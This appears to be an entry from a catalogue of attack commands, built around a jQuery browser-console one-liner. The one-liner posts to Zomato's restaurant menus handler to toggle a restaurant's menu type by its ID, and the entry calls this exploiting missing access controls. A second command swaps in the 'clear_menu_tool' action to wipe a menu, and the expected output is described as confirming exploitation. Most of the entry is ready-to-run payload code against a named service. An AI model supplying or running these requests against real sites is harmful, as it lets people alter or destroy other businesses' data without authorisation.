---
data: >-
  $.ajax({url:"/php/restaurant_menus_handler.php",type:"POST",data:{action:"toggle-res-menu-type",res_id:12345}});
tags:
  - ajax
  - post-request
  - privilege-escalation
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.315Z'
id: 3f3dbebb-7e62-48e7-a272-b8b33c4e2e5e
verified: false
validated: true
submitted: true
---
# ajax-post-toggle-res-menu-type

## Command

```javascript
$.ajax({url:"/php/restaurant_menus_handler.php",type:"POST",data:{action:"toggle-res-menu-type",res_id:12345}});
```

## Description

This JavaScript command, executed in the browser console, sends a POST request to Zomato's restaurant menus handler endpoint to toggle a restaurant's menu type between image and text formats, exploiting missing access controls for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Endpoint path for the handler | Yes |
| type | HTTP method (POST) | Yes |
| data.action | Specifies the action to perform (toggle-res-menu-type) | Yes |
| data.res_id | Target restaurant ID (integer, e.g., from page URL) | Yes |

## Examples

### Basic Usage

```javascript
$.ajax({url:"/php/restaurant_menus_handler.php",type:"POST",data:{action:"toggle-res-menu-type",res_id:12345}});
```

### Advanced Usage

To clear a menu instead, change action:

```javascript
$.ajax({url:"/php/restaurant_menus_handler.php",type:"POST",data:{action:"clear_menu_tool",res_id:12345}});
```

## Expected Output

Successful execution returns no error in console; server processes the request silently. Upon page reload, menu images disappear (text mode) or reappear on repeat toggle, confirming exploitation.

## Related

- [[Related Procedure: Test-Endpoint-Accessibility-as-Normal-User]]
- [[Related Procedure: Verify-Menu-Modification-Exploitation]]
